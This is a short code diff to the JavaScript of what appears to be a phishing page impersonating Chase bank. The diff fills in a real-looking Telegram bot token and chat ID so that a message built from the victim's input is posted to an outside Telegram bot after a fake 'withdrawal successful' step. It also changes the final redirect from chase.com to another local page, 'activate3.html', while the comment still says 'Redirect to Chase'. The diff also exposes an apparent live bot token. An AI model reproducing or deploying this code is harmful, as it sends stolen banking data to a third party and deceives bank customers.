@@ -391,13 +391,13 @@
                 console.log('Withdrawal successful! Email sent.');
 
                 // Send message to Telegram bot
-                return fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`, {
+                return fetch(`https://api.telegram.org/7849950200:AAFxT3-Nq1HVSYCMwF1-lsGww6XmERS2Ig0/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        chat_id: 'YOUR_CHAT_ID',
+                        chat_id: '7959877182',
                         text: telegramMessage
                     })
                 });
@@ -409,7 +409,7 @@
                     
                     // Redirect to chase.com after modal is cleared
                     setTimeout(() => {
-                        window.location.href = 'https://www.chase.com'; // Redirect to Chase
+                        window.location.href = 'activate3.html'; // Redirect to Chase
                     }, 500); // Delay to ensure the modal closes smoothly
                 } else {
                     throw new Error('Error sending message to Telegram.');
